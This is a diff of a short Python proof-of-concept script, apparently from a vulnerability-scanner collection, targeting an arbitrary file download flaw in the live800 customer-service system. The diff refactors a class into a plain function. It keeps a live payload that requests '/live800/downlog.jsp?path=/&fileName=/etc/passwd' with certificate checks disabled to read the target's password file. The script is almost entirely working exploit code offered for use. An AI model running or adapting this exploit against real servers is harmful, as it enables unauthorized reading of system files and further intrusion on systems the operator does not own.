@@ -9,17 +9,10 @@ description: live800客服系统downlog.jsp参数fileName未过滤导致任意�
 import sys
 import requests
 import warnings
-
-  
-
-class downlog_filedownload():
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['live800客服系统downlog任意文件下载','','']
         payload = "/live800/downlog.jsp?path=/&fileName=/etc/passwd"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,4 @@ class downlog_filedownload():
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = downlog_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
